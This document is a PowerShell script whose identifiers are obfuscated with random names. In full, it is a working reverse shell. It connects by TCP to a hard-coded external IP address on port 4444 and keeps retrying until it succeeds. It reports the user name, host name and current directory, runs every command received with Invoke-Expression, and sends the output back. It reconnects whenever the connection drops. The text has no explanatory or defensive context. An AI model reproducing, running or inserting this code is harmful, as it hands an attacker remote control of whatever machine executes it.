class yVVdvtyBby {
    
    [string]$KsoYufhDDaR = "149.28.155.193"
    [int]$fCuvhdxjFFcvkikflLoqh = 4444

    $KAryeyxVQRbqw
    $MntvpGpMpJkUkzxqBzhyno
    $CGkanaNkbrGVkoRtHnmDLjen
    $tCylIVJffPDKCkdq
    $HZIUJoOfQYQZzEflInzSrxni
    $rqchpOkoSB
    [int]$GfwVqITY = 50*1024

    GBvZhQiCqlfvPHcm() {
        $this.MntvpGpMpJkUkzxqBzhyno = $false
        while ($true) {
            try {
                $this.MntvpGpMpJkUkzxqBzhyno = New-Object Net.Sockets.TcpClient($this.KsoYufhDDaR, $this.fCuvhdxjFFcvkikflLoqh)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.LCpLQ()
    }

    LCpLQ() {
        $this.KAryeyxVQRbqw = $this.MntvpGpMpJkUkzxqBzhyno.GetStream()
        $this.tCylIVJffPDKCkdq = New-Object Byte[] $this.GfwVqITY
        $this.rqchpOkoSB = New-Object Text.UTF8Encoding
        $this.CGkanaNkbrGVkoRtHnmDLjen = New-Object IO.StreamWriter($this.KAryeyxVQRbqw, [Text.Encoding]::UTF8, $this.GfwVqITY)
        $this.HZIUJoOfQYQZzEflInzSrxni = New-Object System.IO.StreamReader($this.KAryeyxVQRbqw)
        $this.CGkanaNkbrGVkoRtHnmDLjen.AutoFlush = $true
    }

    GUlpJ() {
        $this.GBvZhQiCqlfvPHcm()
        $this.LBTedrrwESwcdZPsXtfwWK()
    }

    Gchzqv($QXNsgphQa) {
        try {
            [byte[]]$HXJhEPkqvlbh = [text.Encoding]::Ascii.GetBytes($QXNsgphQa)
            $this.CGkanaNkbrGVkoRtHnmDLjen.Write($HXJhEPkqvlbh, 0, $HXJhEPkqvlbh.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.GUlpJ()
        }
    }

    [string] vVxihSrNAPd() {
        try {
            $JJlQIcshYm = $this.KAryeyxVQRbqw.Read($this.tCylIVJffPDKCkdq, 0, $this.GfwVqITY)    
            $jqkgs = ($this.rqchpOkoSB.GetString($this.tCylIVJffPDKCkdq, 0, $JJlQIcshYm))
            return $jqkgs
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.GUlpJ()
            return ""
        }
    }

    [string] hUVjgXRdylI($IXdTdxT) {
        Write-Host $IXdTdxT
        [string] $private:PGrpRQQpIsQfTlZkXg
        try { 
            $private:PGrpRQQpIsQfTlZkXg = Invoke-Expression $IXdTdxT | Out-String
        }
        catch {
            $ATsxulEuI = $_.Exception
            $sJkEmxIeCAbVQTXuolDCC = $ATsxulEuI
            $private:PGrpRQQpIsQfTlZkXg = "`n$ATsxulEuI`n"
        }
        return $private:PGrpRQQpIsQfTlZkXg
    }

    [string] MYkBzINUsW() {
        $ZGdpjDo = [Environment]::UserName
        $cJBRgVUYunOQOnsorBfrZ = [System.Net.Dns]::GetHostName()
        $wnniKWflduxmB = Get-Location
        return "$ZGdpjDo@$cJBRgVUYunOQOnsorBfrZ [$wnniKWflduxmB]~$ "
    }

    LBTedrrwESwcdZPsXtfwWK() {
        while ($this.MntvpGpMpJkUkzxqBzhyno.Connected) {
            $this.Gchzqv($this.MYkBzINUsW())         
            $jqkgs = $this.vVxihSrNAPd()
            $PGrpRQQpIsQfTlZkXg = "`n"
            if ([string]::IsNullOrEmpty($jqkgs)) {
                continue
            }
            $PGrpRQQpIsQfTlZkXg = $this.hUVjgXRdylI($jqkgs)
            $this.Gchzqv($PGrpRQQpIsQfTlZkXg + "`n")
            $this.KAryeyxVQRbqw.Flush()
        }
        $this.MntvpGpMpJkUkzxqBzhyno.Close()
        $this.GUlpJ()
    } 
}

$kTAnbW = [yVVdvtyBby]::new()
$kTAnbW.GUlpJ()
